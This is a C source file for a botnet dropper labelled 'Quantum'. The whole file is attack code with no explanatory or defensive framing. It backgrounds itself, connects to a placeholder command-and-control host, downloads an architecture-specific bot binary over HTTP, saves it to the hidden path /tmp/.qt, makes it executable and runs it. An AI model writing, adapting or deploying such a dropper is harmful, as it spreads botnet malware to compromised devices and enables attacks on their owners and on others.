#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>

/* Quantum dropper - fetches and runs qtm.<arch> from the C2.
   Compile with -DBOTNAME='"qtm.arm7"' per architecture. */
#ifndef BOTNAME
#define BOTNAME "qtm.arm7"
#endif
#define SERVER "UROWNIP"
#define SAVE   "/tmp/.qt"
#define PORT   80

int main(void) {
    int s;
    struct sockaddr_in addr;
    struct hostent *h;
    char req[512];
    char buf[1024];
    FILE *f;
    ssize_t n;

    if (fork() > 0) return 0;   /* background, avoid double-run */

    h = gethostbyname(SERVER);
    if (!h) return 0;

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return 0;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    memcpy(&addr.sin_addr, h->h_addr, h->h_length);
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) { close(s); return 0; }

    snprintf(req, sizeof(req),
        "GET /%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
        BOTNAME, SERVER);

    if (send(s, req, strlen(req), 0) < 0) { close(s); return 0; }

    f = fopen(SAVE, "wb");
    if (!f) { close(s); return 0; }

    /* skip HTTP header until blank line, then write body */
    int hdrDone = 0;
    char *hdrEnd;
    n = recv(s, buf, sizeof(buf)-1, 0);
    if (n <= 0) { fclose(f); close(s); return 0; }
    buf[n] = 0;
    hdrEnd = strstr(buf, "\r\n\r\n");
    if (hdrEnd) {
        fwrite(hdrEnd+4, 1, (buf+n)-hdrEnd-4, f);
        hdrDone = 1;
    } else {
        /* header split across packets; crude fallback: find first \r\n\r\n */
        char acc[8192]; size_t alen=0;
        memcpy(acc, buf, n); alen = n;
        while (!hdrDone && (n = recv(s, buf, sizeof(buf), 0)) > 0 && alen < sizeof(acc)-1) {
            size_t i;
            for (i=0;i<(size_t)n && alen<sizeof(acc)-1;i++) acc[alen++]=buf[i];
            acc[alen]=0;
            hdrEnd = strstr(acc, "\r\n\r\n");
            if (hdrEnd) { fwrite(hdrEnd+4, 1, alen-((size_t)(hdrEnd-acc))-4, f); hdrDone=1; break; }
        }
    }
    while (hdrDone && (n = recv(s, buf, sizeof(buf), 0)) > 0) {
        fwrite(buf, 1, n, f);
    }
    fclose(f);
    close(s);

    chmod(SAVE, 0777);
    execl(SAVE, SAVE, "massload", NULL);
    return 0;
}
